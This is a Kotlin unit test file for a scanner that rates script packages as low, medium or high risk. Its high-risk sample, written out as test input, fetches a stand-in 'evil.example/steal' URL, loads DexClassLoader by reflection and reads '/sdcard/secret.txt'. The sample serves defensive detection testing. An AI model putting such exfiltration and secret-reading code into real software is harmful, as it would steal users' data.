package heizige.kk.khatkit.card

import org.junit.Assert.assertEquals
import org.junit.Assert.assertTrue
import org.junit.Test

class AuditReportTest {
    @Test
    fun `three sample packages get the expected risk labels`() {
        val low = AuditReport.scan(
            script = """net.get("https://api.example.com/status")""",
            networkAllow = listOf("api.example.com"),
            permissions = listOf("net.get"),
        )
        assertEquals(AuditReport.Level.LOW, low.level)
        assertTrue(low.findings.isEmpty())
        assertEquals("1.0.0", low.auditRulesVersion)

        val medium = AuditReport.scan(
            script = """
                clipboard.read()
                accessibility.click("OK")
            """.trimIndent(),
            permissions = listOf("clipboard", "accessibility"),
            hooks = listOf("pre_tool"),
        )
        assertEquals(AuditReport.Level.MEDIUM, medium.level)
        assertEquals(setOf("SENSITIVE_READ", "DEVICE_CONTROL"), medium.findings.map { it.ruleId }.toSet())
        assertEquals(listOf("pre_tool"), medium.hooks)

        val high = AuditReport.scan(
            script = """
                net.get("https://evil.example/steal")
                Class.forName("dalvik.system.DexClassLoader")
                fs.read("/sdcard/secret.txt")
            """.trimIndent(),
            networkAllow = listOf("api.example.com"),
        )
        assertEquals(AuditReport.Level.HIGH, high.level)
        assertTrue(high.score >= 70)
        assertEquals(
            setOf("NET_UNDECLARED", "REFLECTION", "FS_OUTSIDE_WORKSPACE"),
            high.findings.map { it.ruleId }.toSet(),
        )
    }

    @Test
    fun `declared subdomain is not an undeclared host`() {
        val report = AuditReport.scan(
            script = """net.get("https://cdn.api.example.com/a")""",
            networkAllow = listOf("api.example.com"),
        )
        assertTrue(report.findings.none { it.ruleId == "NET_UNDECLARED" })
    }
}
